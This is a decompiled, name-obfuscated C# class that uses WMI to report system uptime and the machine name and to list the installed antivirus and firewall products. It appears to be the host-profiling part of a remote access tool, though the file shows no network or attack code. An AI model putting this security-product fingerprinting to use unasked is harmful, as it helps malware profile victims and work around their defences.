using System;
using System.Management;

// Token: 0x0200000E RID: 14
public static class GClass12
{
	// Token: 0x06000073 RID: 115 RVA: 0x00005C0C File Offset: 0x00003E0C
	public static string smethod_0()
	{
		string result;
		try
		{
			string text = string.Empty;
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem WHERE Primary='true'"))
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						DateTime d = ManagementDateTimeConverter.ToDateTime(managementObject["LastBootUpTime"].ToString());
						TimeSpan timeSpan = TimeSpan.FromTicks((DateTime.Now - d).Ticks);
						text = string.Format("{0}d : {1}h : {2}m : {3}s", new object[]
						{
							timeSpan.Days,
							timeSpan.Hours,
							timeSpan.Minutes,
							timeSpan.Seconds
						});
					}
				}
			}
			if (string.IsNullOrEmpty(text))
			{
				throw new Exception("Getting uptime failed");
			}
			result = text;
		}
		catch (Exception)
		{
			result = string.Format("{0}d : {1}h : {2}m : {3}s", new object[]
			{
				0,
				0,
				0,
				0
			});
		}
		return result;
	}

	// Token: 0x06000074 RID: 116 RVA: 0x00002453 File Offset: 0x00000653
	public static string smethod_1()
	{
		return Environment.MachineName;
	}

	// Token: 0x06000075 RID: 117 RVA: 0x00005D74 File Offset: 0x00003F74
	public static string smethod_2()
	{
		string result;
		try
		{
			string text = string.Empty;
			string scope = GClass8.VistaOrHigher ? "root\\SecurityCenter2" : "root\\SecurityCenter";
			string queryString = "SELECT * FROM AntivirusProduct";
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, queryString))
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					text = text + managementObject["displayName"].ToString() + "; ";
				}
			}
			text = GClass5.smethod_3(text);
			result = ((!string.IsNullOrEmpty(text)) ? text : "N/A");
		}
		catch
		{
			result = "Unknown";
		}
		return result;
	}

	// Token: 0x06000076 RID: 118 RVA: 0x00005E58 File Offset: 0x00004058
	public static string smethod_3()
	{
		string result;
		try
		{
			string text = string.Empty;
			string scope = GClass8.VistaOrHigher ? "root\\SecurityCenter2" : "root\\SecurityCenter";
			string queryString = "SELECT * FROM FirewallProduct";
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, queryString))
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					text = text + managementObject["displayName"].ToString() + "; ";
				}
			}
			text = GClass5.smethod_3(text);
			result = ((!string.IsNullOrEmpty(text)) ? text : "N/A");
		}
		catch
		{
			result = "Unknown";
		}
		return result;
	}
}
